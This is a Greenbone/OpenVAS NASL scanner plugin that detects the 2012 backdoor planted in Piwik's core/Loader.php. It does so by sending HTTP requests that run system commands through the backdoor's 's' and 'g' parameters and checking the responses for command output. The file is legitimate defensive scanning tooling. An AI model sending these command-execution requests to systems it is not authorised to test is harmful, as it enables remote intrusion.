CPE = "cpe:/a:piwik:piwik";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103611" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "Backdoor in Piwik analytics software" );
	script_xref( name: "URL", value: "http://piwik.org/blog/2012/11/security-report-piwik-org-webserver-hacked-for-a-few-hours-on-2012-nov-26th/" );
	script_xref( name: "URL", value: "http://forum.piwik.org/read.php?2,97666" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-11-27 13:36:59 +0100 (Tue, 27 Nov 2012)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "sw_piwik_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "piwik/installed" );
	script_tag( name: "solution", value: "See the References." );
	script_tag( name: "insight", value: "The Backdoor is in 'core/Loader.php' and create also the files:

 lic.log
 core/DataTable/Filter/Megre.php" );
	script_tag( name: "summary", value: "A backdoor has been added to the web server analytics Piwik which
 allows attackers to take control of a system." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
cmds = exploit_commands();
for cmd in keys( cmds ) {
	url = dir + "/core/Loader.php?s=1&g=system('" + cmds[cmd] + "')";
	if(http_vuln_check( port: port, url: url, pattern: cmd )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

